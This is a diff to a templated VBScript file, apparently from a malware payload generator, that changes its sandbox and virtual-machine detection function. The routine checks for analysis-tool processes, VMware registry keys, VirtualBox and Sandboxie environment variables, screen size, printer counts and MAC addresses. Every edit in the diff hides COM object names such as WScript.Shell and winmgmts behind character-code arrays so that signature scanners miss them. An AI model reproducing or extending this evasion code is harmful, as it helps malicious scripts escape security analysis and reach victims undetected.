@@ -42,7 +42,7 @@ Function {{ v.fn_sandbox }}()
     {{ v.fn_sandbox }} = False
     On Error Resume Next
     If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
-    Dim wmi: Set wmi = GetObject("winmgmts:")
+    Dim wmi: Set wmi = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
     Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
     Dim p, j
@@ -54,7 +54,7 @@ Function {{ v.fn_sandbox }}()
     Next
     ' VM registry checks (paths obfuscated via fn_build_str)
     On Error Resume Next
-    Dim sh: Set sh = CreateObject("WScript.Shell")
+    Dim sh: Set sh = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }})))
     sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104))
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
@@ -62,7 +62,7 @@ Function {{ v.fn_sandbox }}()
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
     Dim fso2, drv2
-    Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Set fso2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_fs_obj }})))
     On Error Resume Next
     Set drv2 = fso2.GetDrive("C:")
     If Err.Number = 0 Then
@@ -72,7 +72,7 @@ Function {{ v.fn_sandbox }}()
     Set fso2 = Nothing
     On Error Resume Next
     Dim wmiPrt, printers, prtCount
-    Set wmiPrt = GetObject("winmgmts:")
+    Set wmiPrt = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
         Set printers = wmiPrt.ExecQuery("SELECT Name FROM Win32_Printer")
         prtCount = 0
@@ -84,7 +84,7 @@ Function {{ v.fn_sandbox }}()
     Set wmiPrt = Nothing
     On Error Resume Next
     Dim wmiNa, naQ, naCnt
-    Set wmiNa = GetObject("winmgmts:")
+    Set wmiNa = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     If Err.Number = 0 Then
         Set naQ = wmiNa.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
         naCnt = 0
@@ -95,7 +95,7 @@ Function {{ v.fn_sandbox }}()
     On Error GoTo 0
     Set wmiNa = Nothing
     On Error Resume Next
-    Dim _venv: Set _venv = CreateObject("WScript.Shell").Environment("Process")
+    Dim _venv: Set _venv = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_wscript_shell }}))).Environment("Process")
     If _venv("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
     If _venv("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
     Set _venv = Nothing
